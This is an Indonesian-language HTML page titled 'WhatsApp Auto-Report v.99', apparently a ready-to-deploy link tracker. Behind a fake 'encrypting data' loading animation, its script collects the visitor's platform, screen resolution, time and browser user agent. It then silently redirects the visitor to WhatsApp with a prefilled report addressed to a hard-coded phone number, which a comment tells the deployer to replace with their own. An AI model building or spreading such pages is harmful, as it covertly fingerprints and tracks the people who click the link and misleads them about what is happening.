<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Auto-Report v.99</title>
    <!-- Google Fonts & Lucide Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        :root {
            --primary: #00ff88;
            --bg-dark: #050810;
            --card-bg: rgba(13, 17, 28, 0.9);
            --text-white: #f8fafc;
            --text-dim: #94a3b8;
            --glass-border: rgba(0, 255, 136, 0.2);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-white);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            text-align: center;
        }

        .loader-container {
            position: relative;
            z-index: 10;
        }

        .cyber-ring {
            width: 120px;
            height: 120px;
            border: 4px solid transparent;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
            position: relative;
        }

        .cyber-ring::before {
            content: '';
            position: absolute;
            top: 5px; left: 5px; right: 5px; bottom: 5px;
            border: 2px solid transparent;
            border-top: 2px solid #60efff;
            border-radius: 50%;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-family: 'Space Grotesk';
            font-size: 1.5rem;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }

        p {
            color: var(--text-dim);
            font-size: 0.9rem;
            letter-spacing: 1px;
        }

        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--primary);
            border-radius: 50%;
            margin-right: 8px;
            box-shadow: 0 0 10px var(--primary);
        }

        #log-text {
            margin-top: 20px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.8rem;
            color: #00ff88;
            height: 20px;
        }
    </style>
</head>
<body>

<div class="loader-container">
    <div class="cyber-ring"></div>
    <h1>Menyusun Laporan</h1>
    <p><span class="status-dot"></span> Mengenkripsi Data Transmisi...</p>
    <div id="log-text">Menghubungkan ke Uplink...</div>
</div>

<script>
    lucide.createIcons();

    window.onload = function() {
        const log = document.getElementById('log-text');
        
        // Simulasi progres loading visual
        setTimeout(() => { log.innerText = "Mengambil Metadata Perangkat..."; }, 500);
        setTimeout(() => { log.innerText = "Menyiapkan Protokol v.99..."; }, 1200);
        setTimeout(() => { 
            log.innerText = "Transmisi Dimulai...";
            generateAndSend();
        }, 2000);
    };

    function generateAndSend() {
        // --- KONFIGURASI ---
        const myNumber = "6285974126258"; // GANTI DENGAN NOMOR ANDA
        
        // Mengambil informasi dasar otomatis
        const platform = navigator.platform;
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const time = new Date().toLocaleString('id-ID');
        const userAgent = navigator.userAgent.split(') ')[0] + ')'; // Mengambil info browser singkat

        const reportTemplate = 
            `*â”€â”€â”€ã€” AUTO-REPORT DETECTED ã€•â”€â”€â”€*\n\n` +
            `ğŸš€ *STATUS:* Link Telah Diakses\n` +
            `ğŸ•’ *WAKTU:* ${time}\n` +
            `ğŸ“± *PLATFORM:* ${platform}\n` +
            `ğŸ–¥ï¸ *RESOLUSI:* ${screenRes}\n` +
            `ğŸŒ *BROWSER:* ${userAgent}\n\n` +
            `*â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€*\n` +
            `_Sistem secara otomatis mengirimkan laporan ini karena link telah diaktifkan._`;

        const waUrl = `https://api.whatsapp.com/send?phone=${myNumber}&text=${encodeURIComponent(reportTemplate)}`;

        // Eksekusi pengalihan otomatis
        window.location.href = waUrl;
    }
</script>

</body>
</html>
